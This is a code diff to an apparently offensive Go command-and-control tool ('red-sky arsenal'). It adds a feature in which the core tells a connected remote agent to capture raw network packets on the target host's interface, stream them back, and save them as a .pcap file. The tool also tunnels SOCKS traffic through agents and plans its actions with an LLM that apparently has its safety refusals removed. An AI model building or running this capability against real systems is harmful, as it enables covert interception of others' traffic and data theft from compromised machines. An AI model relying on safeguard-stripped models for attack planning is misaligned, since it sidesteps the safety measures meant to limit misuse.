@@ -6,6 +6,7 @@ import (
 	"context"
 	"crypto/tls"
 	"encoding/base64"
+	"encoding/binary"
 	"encoding/json"
 	"flag"
 	"fmt"
@@ -26,6 +27,7 @@ import (
 	"github.com/sk666G/red-sky---arsenal/internal/scanner"
 	"github.com/sk666G/red-sky---arsenal/internal/session"
 	rsTLS "github.com/sk666G/red-sky---arsenal/internal/tls"
+	"github.com/sk666G/red-sky---arsenal/internal/capturer"
 	"github.com/sk666G/red-sky---arsenal/internal/tunnel"
 	"github.com/sk666G/red-sky---arsenal/internal/tui"
 	"github.com/sk666G/red-sky---arsenal/internal/wire"
@@ -45,6 +47,9 @@ func main() {
 	noLLM := flag.Bool("no-llm", false, "use rule-based planner instead of Ollama")
 	llmModel := flag.String("llm-model", "huihui_ai/qwen2.5-abliterate:14b", "Ollama model for planning")
 	socksBind := flag.String("socks", "", "start a SOCKS5 listener on this address (e.g. 127.0.0.1:1080) that tunnels through the first connected agent")
+	pcapIface := flag.String("pcap", "", "capture raw packets on the target interface (Linux agent only). Requires -pcap-out.")
+	pcapOut := flag.String("pcap-out", "", "path to write the capture to (.pcap)")
+	pcapDuration := flag.Duration("pcap-duration", 30*time.Second, "how long to capture")
 	flag.Parse()
 
 	if *pluginFlag != "" {
@@ -96,6 +101,13 @@ func main() {
 
 	if *socksBind != "" {
 		go startSocks(*socksBind, mgr)
+	}
+
+	if *pcapIface != "" {
+		if *pcapOut == "" {
+			log.Fatalf("-pcap requires -pcap-out")
+		}
+		go runPCAPCapture(mgr, *pcapIface, *pcapOut, *pcapDuration)
 	}
 
 	pl := planner.NewOllama("", *llmModel)
@@ -324,5 +336,75 @@ func startSocks(bind string, mgr *session.Manager) {
 			return
 		}
 		time.Sleep(500 * time.Millisecond)
+	}
+}
+
+
+// runPCAPCapture waits for an agent, opens a capture session, and writes
+// received frames to a .pcap file on the core.
+func runPCAPCapture(mgr *session.Manager, iface, outPath string, duration time.Duration) {
+	// wait for an agent
+	for {
+		if len(mgr.Sessions()) > 0 {
+			break
+		}
+		time.Sleep(500 * time.Millisecond)
+	}
+	s := mgr.Sessions()[0]
+	log.Printf("[pcap] capturing on %s via %s -> %s (duration %s)", iface, s.AgentID, outPath, duration)
+
+	// register a tunnel-like receive slot for capture data
+	sessionID := fmt.Sprintf("cap-%d", time.Now().UnixNano())
+	s.RegisterCaptureChannel(sessionID)
+
+	// open the pcap file
+	pw, err := capturer.NewPCAPWriter(outPath)
+	if err != nil {
+		log.Printf("[pcap] write %s: %v", outPath, err)
+		return
+	}
+	defer pw.Close()
+
+	// ask the agent to start
+	if err := s.SendCaptureStart(sessionID, iface, 0); err != nil {
+		log.Printf("[pcap] send start: %v", err)
+		return
+	}
+
+	deadline := time.After(duration)
+	frames := 0
+	for {
+		select {
+		case <-deadline:
+			// stop the capture
+			s.SendCaptureStop(sessionID)
+			log.Printf("[pcap] duration elapsed — %d frames written to %s", frames, outPath)
+			return
+		case chunk, ok := <-s.GetCaptureChannel(sessionID):
+			if !ok {
+				log.Printf("[pcap] agent closed — %d frames written", frames)
+				return
+			}
+			// chunk = concatenated pcap-record-format frames
+			i := 0
+			for i+16 <= len(chunk) {
+				tsSec := binary.LittleEndian.Uint32(chunk[i : i+4])
+				tsUsec := binary.LittleEndian.Uint32(chunk[i+4 : i+8])
+				incl := binary.LittleEndian.Uint32(chunk[i+8 : i+12])
+				orig := binary.LittleEndian.Uint32(chunk[i+12 : i+16])
+				i += 16
+				if i+int(incl) > len(chunk) {
+					break
+				}
+				f := capturer.Frame{
+					TS:      time.Unix(int64(tsSec), int64(tsUsec)*1000),
+					Data:    chunk[i : i+int(incl)],
+					OrigLen: int(orig),
+				}
+				pw.WriteFrame(f)
+				frames++
+				i += int(incl)
+			}
+		}
 	}
 }
